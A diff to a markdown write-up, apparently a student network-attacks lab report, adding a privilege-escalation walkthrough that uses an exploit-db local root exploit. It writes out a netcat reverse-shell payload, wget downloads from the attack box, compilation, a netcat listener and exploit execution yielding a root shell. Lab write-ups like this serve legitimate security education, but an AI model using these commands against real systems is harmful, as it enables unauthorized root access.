@@ -110,13 +110,61 @@ lsb_release -a
 
 ![login](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/uname.PNG)
 
+​	After using searchsploit to research, I decided on a privilege escalation method found [here](https://www.exploit-db.com/exploits/8572).  First, we download the exploit source code and save it as "8572.c".  Then we create a new file, "run
+", and insert and save the following code:
 
+```bash
+#!/bin/bash
+nc 192.168.1.210 12345 -e /bin/bash
+```
+
+​	We save this, and start up the Python simple.http server with port 8080 on our attack box in the folder.  On the target, we execute the following to download our exploit and payload.
+
+```bash
+cd /tmp
+wget http://192.168.1.210:8080/run
+wget http://192.168.1.210:8080/8572.c
+```
+
+​	Then we compile the C code on that target machine into exploit.
+
+```bash
+gcc -o exploit 8572.c
+```
+
+​	Now we have our payload compiled and ready to run on our target system.  When we execute it, it will run the code in the "run" file, which instructs the system to call back to our attack box with a bash shell (/bin/bash) that is started with root permissions, providing root access and full control of the system.
+
+​	First there are a few more steps.  The documentation indicated that we need to provide the exploit with the PID of the udevd netlink socket.  We can find it easily with
+
+```bash
+cat /proc/net/netlink
+```
+
+![enumsetup](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/pid.PNG)
+
+​	The only non-zero process ID is what we are looking for.  Then we start a netcat listenener on another terminal with:
+
+```bash
+nc -lvp 12345
+```
+
+Now we are ready.  We pass the PID into the exploit and run it with:
+
+```bash
+./exploit 2761
+```
+
+![enumsetup](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/reverseroot.PNG)
+
+​	Success!  Now we stabilize it once more.
+
+![enumsetup](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/stabileroot.PNG)
 
 
 
 ##### D) Enumeration and Persistence
 
-​	Next we will upload [LinEnum](https://github.com/rebootuser/LinEnum) and run it, even though my expectation is this machine is riddled with vulnerabilities.  
+​	Next we will upload [LinEnum](https://github.com/rebootuser/LinEnum) and run it, even though my expectation is this machine is that it is still riddled with vulnerabilities.  
 
 ![enumsetup](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target/screens/enumsetup.PNG)
 
